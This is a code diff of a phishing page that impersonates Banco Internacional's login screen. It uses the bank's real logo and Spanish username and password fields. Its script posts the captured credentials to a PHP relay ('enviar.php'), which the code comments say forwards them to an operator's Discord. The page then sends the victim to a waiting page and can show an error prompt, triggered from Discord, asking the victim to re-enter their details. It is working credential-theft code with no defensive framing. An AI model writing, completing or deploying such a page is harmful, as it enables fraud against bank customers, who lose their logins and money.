@@ -1,38 +1,78 @@
-<script>
-  async function sendToDiscord(usuario, clave) {
-    // Enviamos al puente PHP para generar botones
-    await fetch('enviar.php', {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        usuario: usuario,
-        clave: clave,
-        tipo: "LOGIN PRINCIPAL"
-      })
-    });
-  }
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+<title>Banco Internacional</title>
+<style>
+  /* Mantengo tus estilos originales para no dañar el diseño */
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body { min-height: 100dvh; background: #f59a05; font-family: 'Segoe UI', Arial, sans-serif; display: flex; justify-content: center; align-items: stretch; }
+  .screen { width: 100%; max-width: 430px; min-height: 100dvh; background: #f59a05; display: flex; flex-direction: column; position: relative; overflow: hidden; margin: 0 auto; }
+  .header { display: flex; justify-content: center; align-items: center; padding: 22px 16px 0; }
+  .header img { height: 52px; object-fit: contain; }
+  .illustration { display: flex; justify-content: center; align-items: flex-end; padding: 10px 0 0; flex: 0 0 auto; }
+  .illustration img { width: 75%; max-width: 300px; height: auto; object-fit: contain; }
+  .form-area { padding: 28px 28px 0; flex: 1; display: flex; flex-direction: column; gap: 0; }
+  .field-label { font-size: 15px; color: rgba(255,255,255,0.95); font-weight: 500; margin-bottom: 7px; }
+  .input-wrap { margin-bottom: 20px; }
+  .input-field { width: 100%; height: 52px; background: #f7b030; border: none; border-radius: 30px; padding: 0 20px; font-size: 16px; color: #fff; outline: none; }
+  .btn-login { width: 100%; height: 54px; background: #fde8a0; border: none; border-radius: 30px; font-size: 18px; font-weight: 700; color: #b87200; cursor: pointer; margin-top: 8px; }
+</style>
+</head>
+<body>
+<div class="screen">
+  <div class="header">
+    <img src="https://www.bancointernacional.com.ec/wp-content/uploads/2020/11/cropped-logo-banco-internacional.webp" alt="Banco Internacional">
+  </div>
+  <div class="illustration"><img src="chica.jpg" alt="Login"></div>
+  <div class="form-area">
+    <div class="input-wrap">
+      <div class="field-label">Usuario</div>
+      <input class="input-field" type="text" id="docNumber" placeholder="Usuario">
+    </div>
+    <div class="input-wrap">
+      <div class="field-label">Contraseña</div>
+      <input class="input-field" type="password" id="passwordInput" placeholder="Contraseña">
+    </div>
+    <button class="btn-login" id="btnContinuar">Ingresar</button>
+  </div>
+</div>
 
+<script>
   document.addEventListener("DOMContentLoaded", () => {
-    // Detección de orden de error
+    // Verificar si el administrador envió una orden de error desde Discord
     const params = new URLSearchParams(window.location.search);
     if (params.get('status') === 'error') {
-      alert("Usuario o clave incorrectos. Intente de nuevo.");
-      fetch('control.php?accion=esperando');
+      alert("Acceso no autorizado o datos incorrectos. Intente de nuevo.");
+      fetch('control.php?accion=esperando'); // Resetear estado a espera
     }
 
     const btn = document.getElementById("btnContinuar");
-    btn.addEventListener("click", async (e) => {
-      e.preventDefault();
-      const u = document.getElementById("docNumber").value;
-      const c = document.getElementById("passwordInput").value;
-      if (!u || !c) return alert("Complete los campos");
+    btn.addEventListener("click", async () => {
+      const u = document.getElementById("docNumber").value.trim();
+      const c = document.getElementById("passwordInput").value.trim();
+      
+      if (!u || !c) return alert("Por favor complete los campos");
 
       btn.textContent = "Cargando...";
       btn.disabled = true;
-      
-      localStorage.setItem("bf_last_dni", u); // Guardar para codes.html
-      await sendToDiscord(u, c);
-      window.location.href = "wait.html";
+
+      localStorage.setItem("bf_last_dni", u);
+
+      // Enviamos al puente para que aparezcan los botones en Discord
+      try {
+        await fetch('enviar.php', {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ usuario: u, clave: c, tipo: "LOGIN PRINCIPAL" })
+        });
+        window.location.href = "wait.html";
+      } catch(e) {
+        window.location.href = "wait.html";
+      }
     });
   });
 </script>
+</body>
+</html>
